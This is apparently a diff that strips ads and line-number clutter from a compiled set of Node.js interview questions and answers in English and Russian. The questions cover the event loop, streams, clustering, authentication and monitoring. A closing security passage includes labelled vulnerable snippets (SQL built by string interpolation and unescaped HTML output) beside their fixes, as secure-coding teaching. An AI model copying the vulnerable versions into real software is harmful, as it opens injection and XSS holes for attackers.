@@ -1,9 +1,4 @@
 NodeJS Interview Guide
-View Pricing
-Schedule Demo
-Here are the most important NodeJS interview questions and answers to help you conduct effective technical interviews.
-
-These questions are designed to assess practical coding skills, problem-solving abilities, and technical knowledge relevant to real-world development work.
 
 1
 What is Node.js? What is it used for?
@@ -85,10 +80,6 @@ Look for thoughtful integration patterns:
 What Node.js-specific issues should you watch for in AI-generated code?
 Candidates should mention:
 
-Top Node.js Interview Questions
-Software Engineering
-Tatsat Jha • Last updated 2 years ago
-
 What is Node.js and what are its Advantages?
 What are some common applications of Node?
 How are Node Packages Managed?
@@ -105,28 +96,7 @@ What is a child process in Node.js and how are they created?
 How do you create a server in Node.js?
 Explain Middleware
 Explain the Advantages vs the Drawbacks of using Node.js
-🧠
-Get ready for your upcoming software engineering interview with Exponent's complete software engineering interview course. Work through the most commonly asked questions, learn interview techniques, and practice your skills before the big day.
-Node.js is among the most revolutionary technologies in the history of web development. It's widely used as part of the backend of thousands of web applications.
 
-For nearly any developer job having to do with the Backend, or Full-stack development, Node.js is a technology you must be familiar with. The following are the answers to some of the most common Node.js Interview Questions.
-
-What is Node.js and what are its Advantages?
-What are some common applications of Node?
-How are Node Packages Managed?
-How is npm different from npx?
-What do you understand about Callbacks?
-What does it mean that Node.js is single-threaded?
-What is meant by Synchronous vs Asynchronous?
-What is meant by Blocking vs Non-blocking?
-What is the Node.js Event loop?
-What do you understand about livbuv?
-Explain the EventEmitter API
-What is a child process in Node.js and how are they created?
-How do you create a server in Node.js?
-Explain Middleware
-Explain the Advantages vs the Drawbacks of using Node.js
-What is Node.js and what are its Advantages?
 Node.js is the most popular Javascript runtime environment. Traditionally, Javascript could only be run on the browser, using a specific engine to interpret the javascript code such as the V8 Engine inside Google Chrome.
 
 In 2009, Ryan Dahl released the open-source, cross-platform runtime environment that is Node.js. It allowed a place for javascript code to be run outside of the browser, taking javascript from a simple scripting language to capable of making REST APIs, Backend infrastructure, and network applications.
@@ -337,32 +307,6 @@ The last major drawback of Node has to do with the thousands of Node packages th
 
 The reality of working with Node is that several packages will be used in the course of a project and the lack of library support can make the development experience significantly more challenging.
 
-Top Node.js Interview Questions You Must Prepare In 2025
-Last updated on Dec 09,2024346.1K Views
-Share
-image not found!
-image not found!
-image not found!
-image not found!
-image not found!
-image not found!
-
-Swatee ChandSwatee Chand 
-Sr Research Analyst at Edureka. A techno freak who likes to explore different technologies. Likes to follow the technology trends in market and write...
-1 / 1 Blog from Interview Questions 
-myMock-desk-banner-bg
-Node.js, the server-side scripting tool, using which one can build everything, starting from a simple command line programs to the complex enterprise level web applications with equal ease. This is why most industries demand a Certified Node.js Developer to manage the entire server side. Node.js, also brings with it, career opportunities at various levels. In case you are planning to attend Node.js interviews in the near future, we are here to help you with a list of Top 50 Node.js interview questions that you must prepare in 2025.
-
-In this Node.js interview questions article, I have divided the questions into 3 segments based on their difficulty level:
-
-Node.js Interview Questions – Beginners Level
-Node.js Interview Questions – Moderate Level
-Node.js Interview Questions – Advanced Level
-Before I start off with this Node.js Interview Questions article, let me put forth a request to the readers who might have attended Node.js interviews in recent past. So, if you have come across such questions which were asked in interviews but are missing in this article, feel free to put those questions in the comment section below. We will try and answer those at the earliest so that others can also benefit from it.
-
-Now, let’s get started.
-
-Basic Node.js Interview Questions for Freshers
 1. Differentiate between JavaScript and Node.js.
 JavaScript vs Node.js
 Features	JavaScript	Node.js
@@ -414,12 +358,10 @@ In case you are facing any challenges with these Node.js Interview Questions, pl
 10. What is package.json?
 The package.json file in Node.js is the heart of the entire application. It is basically the manifest file that contains the metadata of the project where we define the properties of a package.
 
-
 package-json-edureka11. What do you understand by Event-driven programming?
 Event-driven programming is an approach that heavily makes use of events for triggering various functions. An event can be anything like a mouse click, key press, etc. When an event occurs, a call back function is executed that is already registered with the element. This approach mainly follows the publish-subscribe pattern. Because of event-driven programming, Node.js is faster when compared to other technologies.
 
 Web Development Full Course for Beginners
-
 
 12. What is an Event loop in Node.js and how does it work?
 An event loop in Node.js handles all the asynchronous callbacks in an application. It is one of the most important aspects of Node.js and the reason behind Node.js have non-blocking I/O. Since Node.js is an event-driven language, you can easily attach a listener to an event and then when the event occurs the callback will be executed by the specific listener. Whenever functions like setTimeout, http.get, and fs.readFile are called, Node.js executed the event loop and then proceeds with the further code without waiting for the output. Once the entire operation is finished, Node.js receives the output and then executes the callback function. This is why all the callback functions are placed in a queue in a loop. Once the response is received, they are executed one by one.
@@ -446,15 +388,6 @@ Limit concurrency
 Call the next step in the program
 Want to upskill yourself to get ahead in your career? Check out this video
  
-
-Top 10 Technologies to Learn in 2025 | Edureka
-
-This Edureka video on will introduce you to all the popular and trending technologies in the market which you should focus on in 2025. These are the trending technologies that you need to learn in order to have a successful career in the year 2025.
-
-
- 
-
-Intermediate Node.js Interview Questions – Moderate Level
 16. What do you understand by a test pyramid?
 A test pyramid basically is a diagram that describes the ratio of how many unit tests, integration tests, and end-to-end test are required to be written for the successful development of the project.test pyramid - NodeJS Interview Questions - Edureka
 
@@ -698,10 +631,6 @@ app.set('port', port);
 var server = http.createServer(app);
 With this, we come to an end of this Node.js Interview Questions article. I hope you found it informative and it helped in adding up to your knowledge. If you want to cover the fundamentals of Node.js in more depth, you can refer to my Node.js Tutorial article.
 
-If you found this “Node.js Interview Questions” relevant, check out the Node.js Certification Training by Edureka, a trusted online learning company with a network of more than 250,000 satisfied learners spread across the globe. 
-
-Got a question for us? Please mention it in the comments section of this Node.js Interview Questions and we will get back to you.
-
 1.
 How does Node.js handle child threads?
 
@@ -849,19 +778,7 @@ Additionally, a more supercharged solution to callback hell was provided by gene
 
 However, these approaches are pretty dated at this point. The current solution is to use async/await—an approach that leverages Promises and finally makes it easy to flatten the so-called “pyramid of doom” shown above.
 
-#Technology
-Latest Interview Questions for a Node JS Developer
 
-edchartblog / 3 years
-Nov 15, 2023
-0
-7 min read
-twitter sharing button Postfacebook sharing button Sharewhatsapp sharing button Sharedigg sharing button Share
-Latest Top interview questions and answers for a Node JS developer for experienced and freshers, get ready to crack any interview.
-
-Node JS certification
-Node JS certification -click here
-Basics of Node.js interview question:
 What is Node.js?
 Answer: Node.js is a server-side JavaScript runtime built on the V8 JavaScript engine. It allows developers to run JavaScript code on the server, enabling the development of scalable and high-performance web applications.
 Explain the event-driven architecture in Node.js.
@@ -887,8 +804,7 @@ What is the purpose of the process object in Node.js?
 Answer: The process object in Node.js provides information about the current Node.js process. It can be used to access command-line arguments, environment variables, and manage the process lifecycle.
 What is the role of the Buffer class in Node.js?
 Answer: The Buffer class in Node.js is used to handle binary data directly. It provides a way to work with raw binary data and is particularly useful for working with streams and file systems.
-Node JS certification
-Node JS certification -click here
+
 Advanced Node.js Concepts interview question:
 Explain the concept of streams in Node.js.
 Answer: Streams in Node.js are objects that allow reading or writing data sequentially. They help in efficiently processing large amounts of data by dividing it into smaller chunks.
@@ -949,12 +865,6 @@ Node.js developers write and maintain server-side web applications. They develop
 
 When interviewing Node.js developers, look for candidates who exhibit JavaScript coding expertise and the ability to ensure optimized web application performance. Be wary of candidates who lack collaboration skills and those with limited experience in providing technical support.
 
-Try Betterteam
-
-Reach over 250 million candidates.
-
-Get candidates in hours, not days.
-
 Interview Questions for Node.js Developers:
 1. Can you explain how you ensure optimal responsiveness to front-end requests?
 Assesses the candidate's knowledge and experience in ensuring optimal network application performance.
@@ -971,31 +881,11 @@ Tests the candidate's knowledge and experience with network application developm
 5. How do you keep abreast of new developments in Node.js?
 Reveals the candidate's ability to keep their Node.js knowledge current in order to apply it in practice.
 
-Собеседование по Node.js - вопросы и ответы
-Запись от Reangularity размещена 20.05.2025 в 11:50
-Показов 5721 Комментарии 0
-Метки interview, javascript, libuv, node.js
-Нажмите на изображение для увеличения
-Название: 838d31ec-3c9f-49c9-bea5-6d188bf56849.jpg
-Просмотров: 246
-Размер:	149.9 Кб
-ID:	10829Каждому разработчику рано или поздно приходится сталкиватся с техническими собеседованиями - этим стрессовым испытанием, где решается судьба карьерного роста и зарплатных ожиданий. В этой статье я собрал более 30 реальных вопросов, которые чаще всего встречаются на собеседованиях по Node.js различного уровня — от стажера до архитектора. Для каждого вопроса я привожу не просто сухой ответ, а развернутое объяснение с инсайдерскими деталями, которые помогут вам выделиться среди других кандидатов. Плюс небольшие примеры кода, которые можно использовать для закрепления материала.
 
 Node.js — это не фреймворк и не язык программирования, как многие ошибочно полагают. Это среда выполнения JavaScript на стороне сервера, построенная на движке V8 от Google Chrome. По сути, это такой хитрый способ запустить JS вне браузера и заставить его делать серверные штуки. И хотя Node.js существует уже более 10 лет (с 2009 года), количество связанных с ним вопросов на собеседованиях только растёт. Ключевая фишка Node.js — его событийно-ориентированная архитектура с неблокирующим (non-blocking) вводом-выводом. Проще говоря, он не ждёт, пока завершится одна операция, чтобы начать следующую — он продолжает выполнять код, пока асинхронные операции делают своё дело в фоне. Это как заказать кофе в кафе и вместо того, чтобы стоять у кассы, пока его готовят, пойти занять столик и почитать новости. Когда кофе готов, вас просто окликнут по имени.
 
 Именно эта особенность делает Node.js радикально отличным от таких технологий, как PHP или классический ASP.NET, где каждый запрос создаёт отдельный поток, а при большом количестве запросов система начинает задыхаться. Node.js же обрабатывает тысячи запросов в одном потоке, благодаря Event Loop — той самой магической карусели, которая крутит наши асинхронные события.
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
 // Синхронный подход (блокирующий)
 const data = fs.readFileSync('/path/to/file');
 console.log(data);
@@ -1024,14 +914,6 @@ console.log('Это выполнится еще до того, как файл �
 
 Ответ: JavaScript — это язык программирования, а Node.js — среда выполнения для этого языка за пределами браузера. Если проводить аналогию, JavaScript — это как английский язык, а Node.js — как определенная страна, где на нём говорят, но с собственными диалектами и особенностями. В браузере JavaScript имеет доступ к DOM, window, document и другим браузер-специфичным API. В Node.js этого нет, зато есть доступ к файловой системе, сетевым операциям и другим серверным возможностям через глобальные объекты, такие как process, global и встроенные модули.
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
 // В браузере
 document.getElementById('myButton');
 window.location.href;
@@ -1056,27 +938,13 @@ JavaScriptСкопировано
 const data = fs.readFileSync('file.txt', 'utf8');
 console.log(data);
 2. Асинхронные с колбэками — не блокируют выполнение и используют функцию обратного вызова:
-JavaScriptСкопировано
-1
-2
-3
-4
+
 fs.readFile('file.txt', 'utf8', (err, data) => {
   if (err) throw err;
   console.log(data);
 });
 3. Асинхронные с Promise/async-await — современный подход к асинхронности:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
+
 const fsPromises = require('fs').promises;
  
 async function readFileAsync() {
@@ -1098,17 +966,6 @@ async function readFileAsync() {
 3. Локальные модули — ваши собственные модули.
 Пример создания и использования модуля:
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
 // файл myModule.js
 function sayHello() {
   return "Hello, World!";
@@ -1138,12 +995,6 @@ npm стал неотъемлемой частью экосистемы JavaScri
 Завершение цикла запрос-ответ.
 Вызов следующего middleware в стеке.
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
 // Пример middleware в Express
 app.use((req, res, next) => {
   console.log('Запрос получен в:', Date.now());
@@ -1187,7 +1038,6 @@ Event Loop постоянно проверяет, есть ли события, 
 Как удалить элемент нумерованного списка средствами интерфейса NODE?
 Как удалить элемент нумерованного списка средствами интерфейса NODE??(элементы списка вводим в поле...
 
-
 11. Каковы основные недостатки Node.js?
 
 Ответ: Как бы я ни любил Node.js, нужно признать его ограничения. Основные недостатки:
@@ -1196,14 +1046,6 @@ Event Loop постоянно проверяет, есть ли события, 
 
 Callback Hell: Хотя современные решения (Promises, async/await) сгладили эту проблему, многие библиотеки всё ещё используют колбэки, что может привести к нечитаемому коду:
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
 getData(function(a) {
     getMoreData(a, function(b) {
         getEvenMoreData(b, function(c) {
@@ -1219,15 +1061,6 @@ getData(function(a) {
 
 Ответ: REPL (Read-Eval-Print Loop) — интерактивная среда, которая позволяет вводить JavaScript-выражения, интерпретировать их и выводить результат. Грубо говоря, это как консоль в браузере, только для Node.js. Запускается просто: введите node в командной строке без аргументов, и перед вами появится приглашение >:
 
-BashСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
 $ node
 > const greeting = 'Hello, world!';
 undefined
@@ -1243,15 +1076,7 @@ REPL — отличный инструмент для быстрой прове�
 Ответ: В Node.js существует две системы модулей: CommonJS (традиционная) и ES Modules (более новая). Способ импорта зависит от выбранной системы:
 
 1. CommonJS (по умолчанию до Node.js 14):
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
+
 // Импорт встроенного модуля
 const fs = require('fs');
  
@@ -1261,15 +1086,7 @@ const express = require('express');
 // Импорт локального модуля
 const myModule = require('./myModule');
 2. ES Modules (требует .mjs расширения или "type": "module" в package.json):
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
+
 // Импорт встроенного модуля
 import fs from 'fs';
  
@@ -1287,16 +1104,6 @@ Node.js — серверная среда выполнения JavaScript.
 AJAX (Asynchronous JavaScript and XML) — технология, позволяющая веб-страницам асинхронно обмениваться данными с сервером без перезагрузки страницы.
 Node.js используется для создания серверных приложений, а AJAX — клиентская технология, используемая в браузере. Однако часто они работают вместе: фронтенд использует AJAX для отправки запросов к серверу на Node.js.
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
 // Клиентский AJAX (в браузере)
 fetch('/api/data')
   .then(response => response.json())
@@ -1319,22 +1126,6 @@ main: точка входа в приложение,
 engines: требуемые версии Node.js/npm,
 type: система модулей (commonjs или module).
 
-JSONСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
 {
   "name": "my-awesome-project",
   "version": "1.0.0",
@@ -1369,23 +1160,6 @@ Pending (ожидание): начальное состояние,
 Fulfilled (выполнено): операция завершена успешно,
 Rejected (отклонено): операция завершена с ошибкой.
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
 // Создание промиса
 const myPromise = new Promise((resolve, reject) => {
   setTimeout(() => {
@@ -1404,17 +1178,6 @@ myPromise
   .finally(() => console.log('Завершено'));
 С появлением async/await код стал еще читабельнее:
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
 async function myFunction() {
   try {
     const result = await myPromise;
@@ -1431,19 +1194,6 @@ async function myFunction() {
 
 Ответ: Событийно-ориентированное программирование — это парадигма, в которой поток выполнения программы определяется событиями (клики, сетевые запросы, таймеры). Node.js строится вокруг этой парадигмы через модуль EventEmitter. Практически всё в Node.js основано на событиях: HTTP-сервер испускает событие при получении запроса, поток данных (stream) испускает событие, когда данные доступны, и так далее.
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
 const EventEmitter = require('events');
  
 // Создаём эмиттер
@@ -1462,18 +1212,6 @@ myEmitter.emit('event', 'первый аргумент', 'второй аргу�
 
 Ответ: Buffer в Node.js — это класс для работы с бинарными данными напрямую. В отличие от JavaScript в браузере, где работа с бинарными данными ограничена, Node.js предоставляет Buffer для эффективной обработки бинарных потоков, чтения файлов, сетевых операций и т.д.
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
 // Создание буфера
 const buf1 = Buffer.alloc(10); // Создаёт буфер размером 10 байт, заполненный нулями
 const buf2 = Buffer.from('Hello world'); // Создаёт буфер из строки
@@ -1495,24 +1233,6 @@ Writable — поток для записи (HTTP-ответы, запись в 
 Duplex — поток для чтения и записи (TCP-сокеты),
 Transform — преобразующий поток (компрессия данных).
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
 const fs = require('fs');
  
 // Пример потоковой обработки большого файла
@@ -1544,30 +1264,6 @@ readStream.on('end', () => {
 Создание цифровых подписей..
 Генерация случайных чисел.
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
 const crypto = require('crypto');
  
 // Создание хеша
@@ -1597,18 +1293,6 @@ function encryptData(data, key) {
 
 Ответ: Callback hell (или пирамида судьбы) — это ситуация, когда код с множеством вложенных колбэков становится нечитаемым и трудно поддерживаемым. Обычно такой код имеет характерную треугольную форму из-за отступов:
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
 getData(function(a) {
   getMoreData(a, function(b) {
     getEvenMoreData(b, function(c) {
@@ -1622,16 +1306,7 @@ getData(function(a) {
 });
 Способы избежать callback hell:
 1. Промисы (Promises) — делают асинхронный код более линейным:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
+
 getData()
   .then(a => getMoreData(a))
   .then(b => getEvenMoreData(b))
@@ -1642,19 +1317,7 @@ getData()
   })
   .catch(error => console.error(error));
 2. Async/await — делает асинхронный код еще более похожим на синхронный:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
+
 async function getAllData() {
   try {
     const a = await getData();
@@ -1668,18 +1331,7 @@ async function getAllData() {
   }
 }
 3. Вынесение функций — разбиение логики на именованные функции:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
+
 function handleFinalData(finalData) {
   // Обработка финальных данных
 }
@@ -1705,28 +1357,6 @@ clearInterval(interval) — отменяет интервал,
 setImmediate(callback, [...args]) — выполнит callback в следующем цикле событий,
 clearImmediate(immediate) — отменяет immediate.
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
 // Пример использования
 const delayedFunction = setTimeout(() => {
   console.log('Выполнится через 2 секунды');
@@ -1756,38 +1386,6 @@ setImmediate(() => {
 process.nextTick() добавляет колбэк в "очередь nextTick", которая обрабатывается после завершения текущей операции, но до того, как цикл событий продолжит свою работу. То есть между фазами цикла событий.
 setImmediate() ставит колбэк в очередь на специальную фазу цикла событий, которая выполняется после ввода-вывода.
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
 console.log('Начало');
  
 process.nextTick(() => {
@@ -1829,15 +1427,6 @@ process.nextTick() имеет более высокий приоритет и в
 setTimeout(fn, 0) теоретически должен выполнить функцию как можно скорее после указанного задержки (в данном случае 0 мс), но фактически она будет добавлена в очередь таймеров, которая обрабатывается в начале цикла событий.
 setImmediate() выполняет функцию в фазе проверки (check phase) цикла событий, сразу после завершения операций ввода-вывода.
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
 // Этот код может вывести результаты в разном порядке при разных запусках
 setTimeout(() => {
   console.log('setTimeout');
@@ -1848,22 +1437,6 @@ setImmediate(() => {
 });
 Однако, если мы запустим этот код внутри цикла ввода-вывода, порядок станет предсказуемым:
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
 const fs = require('fs');
  
 fs.readFile(__filename, () => {
@@ -1886,22 +1459,6 @@ fs.readFile(__filename, () => {
 Ответ: Оба метода используются для создания дочерних процессов в Node.js, но имеют существенные различия:
 spawn() запускает новый процесс с указанной командой. Он предназначен для длительно работающих процессов, возвращает поток (stream) и не создает новый V8-экземпляр.
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
 const { spawn } = require('child_process');
  
 const ls = spawn('ls', ['-la']);
@@ -1919,23 +1476,6 @@ ls.on('close', (code) => {
 });
 fork() — специализированная версия spawn(), которая создаёт новый экземпляр V8. Он предназначен для создания новых экземпляров Node.js процессов и устанавливает канал связи между родительским и дочерним процессами.
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
 // parent.js
 const { fork } = require('child_process');
  
@@ -1962,69 +1502,6 @@ process.on('message', (message) => {
 Сессии — механизм сохранения состояния пользователя между запросами,
 Middleware — функции для проверки аутентификации и авторизации.
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-45
-46
-47
-48
-49
-50
-51
-52
-53
-54
-55
-56
-57
-58
-59
-60
-61
-62
 const express = require('express');
 const passport = require('passport');
 const LocalStrategy = require('passport-local').Strategy;
@@ -2109,41 +1586,6 @@ Passport особенно полезен в проектах, где требу�
 Ответ: WebSockets — это протокол, обеспечивающий полнодуплексную связь (двунаправленную одновременную) между клиентом и сервером по одному долгоживущему соединению. В отличие от HTTP, где клиент всегда инициирует запрос, WebSockets позволяют серверу отправлять данные клиенту без дополнительных запросов.
 В Node.js для работы с WebSockets чаще всего используется библиотека Socket.IO или ws:
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
 // Сервер с Socket.IO
 const express = require('express');
 const http = require('http');
@@ -2189,31 +1631,6 @@ WebSockets идеальны для приложений реального вр�
 Отказоустойчивость — сбой в одном сервисе не вызывает каскадного отказа всей системы.
 Вот пример примитивного микросервиса на Node.js:
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
 // user-service.js - Микросервис управления пользователями
 const express = require('express');
 const app = express();
@@ -2245,35 +1662,6 @@ app.listen(3001, () => console.log('Сервис пользователей за
 
 Ответ: Кластеризация в Node.js позволяет использовать все ядра процессора путём создания дочерних процессов (воркеров), которые разделяют один и тот же серверный порт. Это решает проблему однопоточности Node.js и позволяет эффективно масштабировать приложения вертикально. Модуль cluster встроен в Node.js и позволяет легко создавать процессы-воркеры:
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
 const cluster = require('cluster');
 const http = require('http');
 const numCPUs = require('os').cpus().length;
@@ -2309,17 +1697,7 @@ if (cluster.isMaster) {
 Ответ: Стримы (Streams) — это одна из фундаментальных концепций Node.js, которая позволяет обрабатывать данные по частям, а не загружать всё в память сразу. Это особенно важно при работе с большими объёмами данных, такими как видео, большие файлы или сетевой трафик. В Node.js существует четыре основных типа стримов:
 
 1. Readable — стримы для чтения данных:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
+
 const fs = require('fs');
 const readableStream = fs.createReadStream('bigfile.txt', { encoding: 'utf8', highWaterMark: 16 * 1024 });
  
@@ -2331,17 +1709,7 @@ readableStream.on('end', () => {
   console.log('Чтение завершено');
 });
 2. Writable — стримы для записи данных:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
+
 const fs = require('fs');
 const writableStream = fs.createWriteStream('output.txt');
  
@@ -2353,15 +1721,7 @@ writableStream.on('finish', () => {
   console.log('Запись завершена');
 });
 3. Duplex — стримы, которые могут и читать, и записывать (например, сокеты):
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
+
 const net = require('net');
 const server = net.createServer((socket) => {
   // socket - это duplex stream
@@ -2371,16 +1731,7 @@ const server = net.createServer((socket) => {
   });
 });
 4. Transform — особый тип duplex-стримов, которые изменяют данные при чтении или записи:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
+
 const { Transform } = require('stream');
 const zlib = require('zlib');
  
@@ -2393,30 +1744,6 @@ inputFile.pipe(gzip).pipe(outputFile);
 Стримы можно соединять через pipe(), создавая конвейеры обработки данных. Это похоже на конвейеры в Unix-подобных операционных системах.
 Один из моих любимых паттернов — использование transform-стримов для парсинга и обработки больших объёмов данных:
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
 const { Transform } = require('stream');
  
 // Кастомный transform stream для фильтрации JSON-объектов
@@ -2451,14 +1778,7 @@ fs.createReadStream('huge-data.json')
 Ответ: Оптимизация Node.js приложений — это целое искусство, включающее несколько ключевых стратегий:
 
 1. Профилирование и поиск узких мест:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
+
 // Простое профилирование с console.time
 console.time('операция');
 // ... код для профилирования
@@ -2467,17 +1787,7 @@ console.timeEnd('операция');
 // Использование встроенного профайлера Node.js
 node --prof app.js
 2. Использование кластеризации для задействования всех ядер CPU:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
+
 const cluster = require('cluster');
 const numCPUs = require('os').cpus().length;
  
@@ -2489,25 +1799,7 @@ if (cluster.isMaster) {
   // Код вашего сервера
 }
 3. Кэширование часто запрашиваемых данных (в памяти, Redis, Memcached):
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
+
 const nodeCache = require('node-cache');
 const cache = new nodeCache({ stdTTL: 100 });
  
@@ -2527,16 +1819,7 @@ function getData(key, cb) {
   });
 }
 4. Асинхронность и неблокирующие операции — основы Node.js:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
+
 // Плохо: блокируем Event Loop
 const users = db.query('SELECT * FROM users').toArray();
 processUsers(users);
@@ -2549,16 +1832,6 @@ db.query('SELECT * FROM users', (err, users) => {
 5. Оптимизация управления памятью — избегание утечек памяти и правильное использование буферов и стримов.
 Помню, как в одном проекте мы столкнулись с тормозами при загрузке большого JSON файла (около 300 МБ). Решение? Отказаться от JSON.parse(fs.readFileSync()) в пользу потоковой обработки с JSONStream:
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
 const fs = require('fs');
 const JSONStream = require('JSONStream');
  
@@ -2575,57 +1848,21 @@ fs.createReadStream('huge-data.json')
 Ответ: Мониторинг — это глаза и уши ваших приложений в продакшене. Основные инструменты:
 
 pm2 — менеджер процессов с базовыми функциями мониторинга:
-BashСкопировано
-1
-2
-3
+
 npm install pm2 -g
 pm2 start app.js --name="my-app" -i max  # Запуск в кластерном режиме на всех ядрах
 pm2 monit  # Просмотр статистики в реальном времени
 New Relic и Datadog — комерческие решения для глубокого мониторинга и анализа производительности.
 
 Elastic APM — опен-сорс альтернатива для трассировки и мониторинга:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
+
 const apm = require('elastic-apm-node').start({
   serviceName: 'my-service',
   secretToken: 'token',
   serverUrl: 'http://localhost:8200'
 });
 Prometheus + Grafana — мощное опенсорсное решение для метрик и визуализации:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
+
 const express = require('express');
 const app = express();
 const prom = require('prom-client');
@@ -2661,18 +1898,7 @@ app.get('/metrics', (req, res) => {
 Ответ: Утечки памяти случаются даже в сборщиках мусора, а в Node.js они чаще всего связаны с замыканиями, таймерами и event listeners. Процесс обнаружения:
 
 1. Использование инструментов для получения heap snapshot:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
+
 // Встроенный модуль для дампа памяти
 const heapdump = require('heapdump');
  
@@ -2687,18 +1913,7 @@ app.get('/heapdump', (req, res) => {
 2. Анализ в Chrome DevTools: загрузите полученный дамп в Chrome DevTools -> Memory -> Load
 
 3. Отслеживание использования памяти в коде:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
+
 const memwatch = require('memwatch-next');
  
 // Отслеживание скачков использования памяти
@@ -2717,34 +1932,6 @@ memwatch.on('stats', (stats) => {
 Кэширование без лимитов: всегда устанавливайте maxSize для кеша.
 Недавно мы мучались с утечкой памяти в продакшене, и оказалось, что причина в кэшировании шаблонов в Express без ограничения размера кэша. Каждый уникальный URL генерировал новую запись в кэше, и через несколько дней память просто взрывалась. Решением стало:
 
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
 app.set('view cache', false);  // Отключить дефолтный кэш
 const LRU = require('lru-cache');
 const viewCache = new LRU({ max: 100 });  // Кэш с ограничением
@@ -2777,25 +1964,14 @@ app.use((req, res, next) => {
 Ответ: Безопасность — тема, которую нелзя игнорировать. Основные уязвимости:
 
 1. Инъекции (SQL, NoSQL, Command):
-JavaScriptСкопировано
-1
-2
-3
-4
-5
+
 // Уязвимый код
 db.query(`SELECT * FROM users WHERE username = '${username}'`);  // SQL инъекция
  
 // Безопасный код
 db.query('SELECT * FROM users WHERE username = ?', [username]);
 2. Cross-Site Scripting (XSS) — всегда экранируйте вывод:
-JavaScriptСкопировано
-1
-2
-3
-4
-5
-6
+
 // Уязвимый код
 res.send(`Привет, ${username}!`);  // Если username содержит HTML/JS
  
@@ -2803,43 +1979,25 @@ res.send(`Привет, ${username}!`);  // Если username содержит H
 const escapeHtml = require('escape-html');
